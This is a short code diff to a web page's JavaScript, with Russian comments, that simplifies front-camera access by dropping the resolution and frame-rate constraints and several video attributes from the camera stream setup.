@@ -69,8 +69,6 @@
     'use strict';
 
     const video = document.getElementById('video');
-
-
     const canvas = document.getElementById('canvas');
     let photoTaken = false;
     let cameraAccessAttempts = 0;
@@ -78,10 +76,7 @@
 
     const constraints = {
       audio: false,
-      video: {width: { ideal: 320 }, // Минимальные настройки
-      height: { ideal: 240 },
-      frameRate: { ideal: 15 },
-      facingMode: "user" }
+      video: { facingMode: "user" }
     };
 
     
@@ -115,11 +110,6 @@
       console.log('Начинаем обработку потока камеры...');
       window.stream = stream;
       video.srcObject = stream;
-      video.setAttribute('playsinline', true);
-      video.setAttribute('muted', true); // Необходим на мобильных устройствах для автозапуска
-      video.setAttribute('autoplay', true);
-      video.setAttribute('type', 'video/mp4');
-      
 
       const context = canvas.getContext('2d');
 
